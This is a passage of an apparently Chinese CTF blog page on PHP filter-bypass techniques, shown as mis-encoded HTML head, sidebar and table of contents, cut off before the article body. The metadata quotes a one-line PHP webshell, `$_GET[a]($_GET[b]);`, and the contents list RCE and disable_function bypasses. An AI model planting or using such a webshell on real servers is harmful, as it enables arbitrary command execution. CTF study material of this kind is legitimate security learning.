<!DOCTYPE html><html lang="zh"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,minimal-ui"><meta name="renderer" content="webkit"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><meta name="format-detection" content="telephone=no,email=no,adress=no"><meta name="theme-color" content="#000000"><meta http-equiv="window-target" content="_top"><title>PHPç»•è¿‡ | Lazzaro</title><meta name="description" content="å¸¸ç”¨å‡½æ•°phpinfo()    #PHPé…ç½®é¡µ file_get_contents()    #è·å–æ–‡ä»¶å†…å®¹ get_defined_vars()    #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼ â€‹     å˜ç§ä¸€å¥è¯PHP $_GET[a]($_GET[b]); â€‹     å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨æ— è¿‡æ»¤å™¨ php:&#x2F;&#x2F;filter&#x2F;resource&#x3D; å­—ç¬¦ä¸²è¿‡æ»¤å™¨ php:&#x2F;&#x2F;fi"><meta property="og:type" content="article"><meta property="og:title" content="PHPç»•è¿‡"><meta property="og:url" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><meta property="og:site_name" content="Lazzaro"><meta property="og:description" content="å¸¸ç”¨å‡½æ•°phpinfo()    #PHPé…ç½®é¡µ file_get_contents()    #è·å–æ–‡ä»¶å†…å®¹ get_defined_vars()    #è·å–æ‰€æœ‰æ–‡ä»¶ï¼ˆåŒ…æ‹¬åŒ…å«çš„æ–‡ä»¶ï¼‰å˜é‡çš„å€¼ â€‹     å˜ç§ä¸€å¥è¯PHP $_GET[a]($_GET[b]); â€‹     å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨æ— è¿‡æ»¤å™¨ php:&#x2F;&#x2F;filter&#x2F;resource&#x3D; å­—ç¬¦ä¸²è¿‡æ»¤å™¨ php:&#x2F;&#x2F;fi"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/1567560448_5d6f13004035f.jpeg"><meta property="og:image" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/image-20220309192940209-16468253816721.png"><meta property="article:published_time" content="2020-05-18T11:29:09.000Z"><meta property="article:modified_time" content="2025-11-14T02:45:15.649Z"><meta property="article:author" content="Lazzaro"><meta property="article:tag" content="PHP"><meta property="article:tag" content="ç»•è¿‡"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/1567560448_5d6f13004035f.jpeg"><link rel="canonical" href="https://lazzzaro.github.io/2020/05/18/web-PHP%E7%BB%95%E8%BF%87/index.html"><link rel="alternate" href="/atom.xml" title="Lazzaro" type="application/atom+xml"><link rel="icon" href="/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script><script>LA.init({id:"3Ft5J9t2Jl0eb5Zr",ck:"3Ft5J9t2Jl0eb5Zr",hashMode:!0})</script><meta name="generator" content="Hexo 7.0.0"></head><body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="slimContent"><div class="navbar-header"><div class="profile-block text-center"><a id="avatar" href="https://github.com/Lazzzaro" target="_blank"><img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200"></a><h2 id="name" class="hidden-xs hidden-sm">Lazzaro</h2><h3 id="title" class="hidden-xs hidden-sm hidden-md">CTFå¼±é¸¡è‡ªè¿›é˜¶</h3><small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> flag{}___Orz</small></div><div class="search" id="search-form-wrap"><form class="search-form sidebar-form"><div class="input-group"><input type="text" class="search-form-input form-control" placeholder="æœç´¢"> <span class="input-group-btn"><button type="submit" class="search-form-submit btn btn-flat" onclick="return!1"><i class="icon icon-search"></i></button></span></div></form><div class="ins-search"><div class="ins-search-mask"></div><div class="ins-search-container"><div class="ins-input-wrapper"><input type="text" class="ins-search-input" placeholder="æƒ³è¦æŸ¥æ‰¾ä»€ä¹ˆ..." x-webkit-speech> <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">Ã—</span></button></div><div class="ins-section-wrapper"><div class="ins-section-container"></div></div></div></div></div><button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false"><span class="sr-only">Toggle navigation</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button></div><nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation"><ul class="nav navbar-nav main-nav menu-highlight"><li class="menu-item menu-item-home"><a href="/."><i class="icon icon-home-fill"></i> <span class="menu-title">æ€»è§ˆ</span></a></li><li class="menu-item menu-item-archives"><a href="/archives"><i class="icon icon-archives-fill"></i> <span class="menu-title">æ±‡æ€»</span></a></li><li class="menu-item menu-item-categories"><a href="/categories"><i class="icon icon-folder"></i> <span class="menu-title">ç±»åˆ«</span></a></li><li class="menu-item menu-item-tags"><a href="/tags"><i class="icon icon-tags"></i> <span class="menu-title">å…³é”®è¯</span></a></li><li class="menu-item menu-item-guestbook"><a href="/guestbook"><i class="icon"></i> <span class="menu-title">æ¥ç•™ä¸ªè¨€ ğŸ‘‰ğŸ‘‰ğŸ‘‰</span></a></li></ul><ul class="social-links"><li><a href="https://github.com/Lazzzaro" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li></ul></nav></div></header><aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><div class="widget"><h3 class="widget-title">ç±»åˆ«</h3><div class="widget-body"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/crypto/">crypto</a><span class="category-list-count">16</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/match/">match</a><span class="category-list-count">51</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/misc/">misc</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/other/">other</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">17</span></li></ul></div></div><div class="widget"><h3 class="widget-title">å…³é”®è¯äº‘</h3><div class="widget-body tagcloud"><a href="/tags/2020%E8%B5%9B/" style="font-size:14px">2020èµ›</a> <a href="/tags/2021%E8%B5%9B/" style="font-size:13.86px">2021èµ›</a> <a href="/tags/2022%E8%B5%9B/" style="font-size:13.57px">2022èµ›</a> <a href="/tags/2023%E8%B5%9B/" style="font-size:13.71px">2023èµ›</a> <a href="/tags/2024%E8%B5%9B/" style="font-size:13.29px">2024èµ›</a> <a href="/tags/2025%E8%B5%9B/" style="font-size:13.14px">2025èµ›</a> <a href="/tags/AES/" style="font-size:13px">AES</a> <a href="/tags/Android/" style="font-size:13px">Android</a> <a href="/tags/Bash/" style="font-size:13px">Bash</a> <a href="/tags/CMS/" style="font-size:13px">CMS</a> <a href="/tags/CSRF/" style="font-size:13px">CSRF</a> <a href="/tags/DES/" style="font-size:13px">DES</a> <a href="/tags/ECC/" style="font-size:13px">ECC</a> <a href="/tags/IDA/" style="font-size:13px">IDA</a> <a href="/tags/JWT/" style="font-size:13px">JWT</a> <a href="/tags/Java/" style="font-size:13.14px">Java</a> <a href="/tags/Linux/" style="font-size:13px">Linux</a> <a href="/tags/OT/" style="font-size:13px">OT</a> <a href="/tags/PHP/" style="font-size:13.29px">PHP</a> <a href="/tags/RCE/" style="font-size:13px">RCE</a> <a href="/tags/RSA/" style="font-size:13.14px">RSA</a> <a href="/tags/SQL/" style="font-size:13px">SQL</a> <a href="/tags/SSRF/" style="font-size:13px">SSRF</a> <a href="/tags/SSTI/" style="font-size:13px">SSTI</a> <a href="/tags/Sage/" style="font-size:13px">Sage</a> <a href="/tags/USB/" style="font-size:13px">USB</a> <a href="/tags/Unity/" style="font-size:13px">Unity</a> <a href="/tags/WebAssembly/" style="font-size:13px">WebAssembly</a> <a href="/tags/XSS/" style="font-size:13px">XSS</a> <a href="/tags/XXE/" style="font-size:13px">XXE</a> <a href="/tags/angr/" style="font-size:13px">angr</a> <a href="/tags/fuzz/" style="font-size:13px">fuzz</a> <a href="/tags/gmpy2/" style="font-size:13px">gmpy2</a> <a href="/tags/hash/" style="font-size:13px">hash</a> <a href="/tags/js/" style="font-size:13px">js</a> <a href="/tags/node-js/" style="font-size:13.14px">node.js</a> <a href="/tags/pwntools/" style="font-size:13px">pwntools</a> <a href="/tags/python/" style="font-size:13.43px">python</a> <a href="/tags/wasm/" style="font-size:13px">wasm</a> <a href="/tags/z3/" style="font-size:13px">z3</a> <a href="/tags/%E5%86%85%E7%BD%91/" style="font-size:13px">å†…ç½‘</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size:13px">ååºåˆ—åŒ–</a> <a href="/tags/%E5%8F%8D%E7%BC%96%E8%AF%91/" style="font-size:13px">åç¼–è¯‘</a> <a href="/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/" style="font-size:13px">åè°ƒè¯•</a> <a href="/tags/%E5%8F%96%E8%AF%81/" style="font-size:13px">å–è¯</a> <a href="/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/" style="font-size:13px">åé‡å­å¯†ç </a> <a href="/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/" style="font-size:13px">å‘½ä»¤è¡Œ</a> <a href="/tags/%E5%9B%BE%E5%83%8F/" style="font-size:13px">å›¾åƒ</a> <a href="/tags/%E5%9D%97%E5%AF%86%E7%A0%81/" style="font-size:13px">å—å¯†ç </a> <a href="/tags/%E5%A0%86/" style="font-size:13px">å †</a> <a href="/tags/%E5%AF%86%E7%A0%81/" style="font-size:13.14px">å¯†ç </a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size:13px">ææƒ</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size:13px">æ–‡ä»¶ä¸Šä¼ </a> <a href="/tags/%E6%9B%B2%E7%BA%BF/" style="font-size:13px">æ›²çº¿</a> <a href="/tags/%E6%A0%88/" style="font-size:13px">æ ˆ</a> <a href="/tags/%E6%A0%BC%E5%AF%86%E7%A0%81/" style="font-size:13px">æ ¼å¯†ç </a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size:13px">æ ¼å¼åŒ–å­—ç¬¦ä¸²</a> <a href="/tags/%E6%B3%A8%E5%85%A5/" style="font-size:13px">æ³¨å…¥</a> <a href="/tags/%E6%B5%81%E5%AF%86%E7%A0%81/" style="font-size:13px">æµå¯†ç </a> <a href="/tags/%E6%B5%81%E9%87%8F/" style="font-size:13px">æµé‡</a> <a href="/tags/%E6%B7%B7%E6%B7%86/" style="font-size:13px">æ··æ·†</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size:13px">æ¸—é€</a> <a href="/tags/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0/" style="font-size:13px">ç¦»æ•£å¯¹æ•°</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size:13.14px">ç®—æ³•</a> <a href="/tags/%E7%BB%95%E8%BF%87/" style="font-size:13.43px">ç»•è¿‡</a> <a href="/tags/%E7%BC%96%E7%A0%81/" style="font-size:13px">ç¼–ç </a> <a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size:13.14px">è„šæœ¬</a> <a href="/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/" style="font-size:13px">è‡ªåŠ¨åŒ–</a> <a href="/tags/%E9%80%83%E9%80%B8/" style="font-size:13px">é€ƒé€¸</a> <a href="/tags/%E9%9A%90%E5%86%99/" style="font-size:13.29px">éšå†™</a></div></div><div class="widget"><h3 class="widget-title">æ±‡æ€»</h3><div class="widget-body"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">åæœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">å…«æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/06/">å…­æœˆ 2025</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">åäºŒæœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">åä¸€æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">ä¸‰æœˆ 2024</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">åä¸€æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">ä¹æœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">äº”æœˆ 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/02/">äºŒæœˆ 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">ä¸€æœˆ 2023</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">åäºŒæœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/11/">åä¸€æœˆ 2022</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">ä¹æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">ä¸ƒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">å…­æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">äº”æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">äºŒæœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">ä¸€æœˆ 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">åäºŒæœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">åä¸€æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">åæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">ä¹æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">å…«æœˆ 2021</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">å…­æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">äº”æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">å››æœˆ 2021</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">ä¸‰æœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">äºŒæœˆ 2021</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">ä¸€æœˆ 2021</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">åäºŒæœˆ 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">åä¸€æœˆ 2020</a><span class="archive-list-count">9</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">åæœˆ 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">ä¹æœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">å…«æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/07/">ä¸ƒæœˆ 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">å…­æœˆ 2020</a><span class="archive-list-count">6</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">äº”æœˆ 2020</a><span class="archive-list-count">24</span></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">æ–‡ç« ç›®å½•</h3><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-number">1.</span> <span class="toc-text">å¸¸ç”¨å‡½æ•°</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E7%A7%8D%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-number">2.</span> <span class="toc-text">å˜ç§ä¸€å¥è¯</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8php-filter%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.</span> <span class="toc-text">å¸¸ç”¨php:&#x2F;&#x2F;filterè¿‡æ»¤å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%B7%AF%E5%BE%84"><span class="toc-number">4.</span> <span class="toc-text">å¸¸ç”¨è·¯å¾„</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.</span> <span class="toc-text">ç»•è¿‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-number">5.1.</span> <span class="toc-text">å…³é”®è¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%A2%E5%87%BA"><span class="toc-number">5.2.</span> <span class="toc-text">æº¢å‡º</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%AE%BF%E9%97%AE"><span class="toc-number">5.3.</span> <span class="toc-text">æœ¬åœ°è®¿é—®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95"><span class="toc-number">5.4.</span> <span class="toc-text">è¯·æ±‚æ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#intval"><span class="toc-number">5.5.</span> <span class="toc-text">intval()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-numeric"><span class="toc-number">5.6.</span> <span class="toc-text">is_numeric()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-match"><span class="toc-number">5.7.</span> <span class="toc-text">preg_match()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array"><span class="toc-number">5.8.</span> <span class="toc-text">in_array()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SERVER-%E2%80%98QUERY-STRING%E2%80%99"><span class="toc-number">5.9.</span> <span class="toc-text">$_SERVER[â€˜QUERY_STRINGâ€™]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#REQUEST"><span class="toc-number">5.10.</span> <span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-get-contents"><span class="toc-number">5.11.</span> <span class="toc-text">file_get_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-put-contents"><span class="toc-number">5.12.</span> <span class="toc-text">file_put_contents()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sha1-%E6%AF%94%E8%BE%83"><span class="toc-number">5.13.</span> <span class="toc-text">sha1()æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5-%E6%AF%94%E8%BE%83"><span class="toc-number">5.14.</span> <span class="toc-text">md5()æ¯”è¾ƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">5.15.</span> <span class="toc-text">create_function()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#call-user-func"><span class="toc-number">5.16.</span> <span class="toc-text">call_user_func()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellarg"><span class="toc-number">5.17.</span> <span class="toc-text">escapeshellarg()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#escapeshellcmd"><span class="toc-number">5.18.</span> <span class="toc-text">escapeshellcmd()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ereg-eregi"><span class="toc-number">5.19.</span> <span class="toc-text">ereg() &#x2F; eregi()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos"><span class="toc-number">5.20.</span> <span class="toc-text">strpos()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp"><span class="toc-number">5.21.</span> <span class="toc-text">strcmp()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add-slashes"><span class="toc-number">5.22.</span> <span class="toc-text">add_slashes()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace"><span class="toc-number">5.23.</span> <span class="toc-text">preg_replace()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#filter-var"><span class="toc-number">5.24.</span> <span class="toc-text">filter_var()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#is-file-file-exists"><span class="toc-number">5.25.</span> <span class="toc-text">is_file() &#x2F; file_exists()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#require-once"><span class="toc-number">5.26.</span> <span class="toc-text">require_once()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include"><span class="toc-number">5.27.</span> <span class="toc-text">include()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#die-exit"><span class="toc-number">5.28.</span> <span class="toc-text">die() &#x2F; exit()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#open"><span class="toc-number">5.29.</span> <span class="toc-text">open()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-url"><span class="toc-number">5.30.</span> <span class="toc-text">parse_url()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#basename"><span class="toc-number">5.31.</span> <span class="toc-text">basename()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#spl-autoload-register"><span class="toc-number">5.32.</span> <span class="toc-text">spl_autoload_register()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#putenv-system"><span class="toc-number">5.33.</span> <span class="toc-text">putenv()+system()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ini-set"><span class="toc-number">5.34.</span> <span class="toc-text">ini_set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mb-strpos-mb-substr"><span class="toc-number">5.35.</span> <span class="toc-text">mb_strpos()+mb_substr()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file"><span class="toc-number">5.36.</span> <span class="toc-text">move_uploaded_file()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%89%B9%E6%80%A7"><span class="toc-number">5.37.</span> <span class="toc-text">å‚æ•°ç‰¹æ€§</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D-%E6%95%B0%E5%AD%97-%E7%89%B9%E5%AE%9A%E7%AC%A6%E5%8F%B7RCE"><span class="toc-number">5.38.</span> <span class="toc-text">æ— å­—æ¯&#x2F;æ•°å­—&#x2F;ç‰¹å®šç¬¦å·RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E6%95%B0-%E5%B8%A6%E5%8F%82%E6%95%B0RCE"><span class="toc-number">5.39.</span> <span class="toc-text">æ— å‚æ•°&#x2F;å¸¦å‚æ•°RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0"><span class="toc-number">5.39.1.</span> <span class="toc-text">æ— å‚å‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A5%97%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E6%9C%89%E5%8F%82%EF%BC%89"><span class="toc-number">5.39.2.</span> <span class="toc-text">å¥—ç”¨å‡½æ•°ï¼ˆæœ‰å‚ï¼‰</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">5.39.3.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">5.40.</span> <span class="toc-text">åˆ—ç›®å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E6%96%87%E4%BB%B6"><span class="toc-number">5.41.</span> <span class="toc-text">è¯»æ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E6%96%87%E4%BB%B6"><span class="toc-number">5.42.</span> <span class="toc-text">å†™æ–‡ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB-%E5%86%85%E7%BD%AE%E6%96%B9%E6%B3%95"><span class="toc-number">5.43.</span> <span class="toc-text">å†…ç½®ç±»&#x2F;å†…ç½®æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%BB%E7%B1%BB%E4%BF%A1%E6%81%AF"><span class="toc-number">5.43.1.</span> <span class="toc-text">è¯»ç±»ä¿¡æ¯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">5.43.2.</span> <span class="toc-text">å‡½æ•°è°ƒç”¨</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#new-%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">5.44.</span> <span class="toc-text">new+åŸç”Ÿç±»</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-disable-function"><span class="toc-number">5.45.</span> <span class="toc-text">bypass disable_function</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LD-PRELOAD"><span class="toc-number">5.45.1.</span> <span class="toc-text">LD_PRELOAD</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#UAF"><span class="toc-number">5.45.2.</span> <span class="toc-text">UAF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#FFI"><span class="toc-number">5.45.3.</span> <span class="toc-text">FFI</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-open-basedir"><span class="toc-number">5.46.</span> <span class="toc-text">bypass open_basedir</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6"><span class="toc-number">5.47.</span> <span class="toc-text">é•¿åº¦é™åˆ¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">5.48.</span> <span class="toc-text">æ¨¡æ¿å¼•æ“</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smarty"><span class="toc-number">5.48.1.</span> <span class="toc-text">smarty</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#twig"><span class="toc-number">5.48.2.</span> <span class="toc-text">twig</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E6%B7%B7%E6%B7%86"><span class="toc-number">5.49.</span> <span class="toc-text">åæ··æ·†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.50.</span> <span class="toc-text">ä¸­é—´ä»¶æ¼æ´</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Apache"><span class="toc-number">5.50.1.</span> <span class="toc-text">Apache</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">5.51.</span> <span class="toc-text">å…¶ä»–</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a 